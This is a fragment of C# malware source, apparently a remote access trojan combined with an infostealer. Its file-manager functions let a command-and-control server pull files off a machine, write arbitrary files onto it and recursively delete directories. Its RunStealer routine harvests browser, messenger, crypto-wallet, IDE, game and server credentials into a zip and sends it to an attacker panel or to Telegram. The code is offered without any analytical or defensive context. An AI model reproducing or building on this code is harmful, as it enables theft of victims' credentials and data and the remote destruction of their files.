        private static void FmDownloadFile(string path)
        {
            Task.Run(() =>
            {
                try
                {
                    var fi = new System.IO.FileInfo(path);
                    if (fi.Length > 52428800)
                    {
                        string pathEsc2 = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                        C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc2 + "\",\"error\":\"File too large (>50MB)\"}");
                        return;
                    }
                    byte[] data = System.IO.File.ReadAllBytes(path);
                    string b64 = Convert.ToBase64String(data);
                    string name = System.IO.Path.GetFileName(path).Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"name\":\"" + name + "\",\"data\":\"" + b64 + "\"}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmDelete(string path)
        {
            Task.Run(() =>
            {
                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                try
                {
                    if (System.IO.Directory.Exists(path))
                        System.IO.Directory.Delete(path, true);
                    else
                        System.IO.File.Delete(path);
                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmUploadFile(string path, string b64data)
        {
            Task.Run(() =>
            {
                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                try
                {
                    byte[] data = Convert.FromBase64String(b64data);
                    string dir = System.IO.Path.GetDirectoryName(path);
                    if (!string.IsNullOrEmpty(dir) && !System.IO.Directory.Exists(dir))
                        System.IO.Directory.CreateDirectory(dir);
                    System.IO.File.WriteAllBytes(path, data);
                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void RunStealer()
        {
            try
            {
                using (var zip = new InMemoryZip())
                {
                    SystemInfoCollector.Collect(zip);
                    ChromiumCollector.Collect(zip);
                    GeckoCollector.Collect(zip);
                    MessengersCollector.Collect(zip);
                    CryptoCollector.Collect(zip);
                    IDECollector.Collect(zip);
                    GamesCollector.Collect(zip);
                    ServersCollector.Collect(zip);

                    if (zip.Count == 0) return;

                    byte[] zipData = zip.ToArray();
                    string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";

                    if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        Task.Run(() => PanelSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                    else
                    {
                        Task.Run(() => TelegramSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                }
            }
            catch { }
        }
    }
}
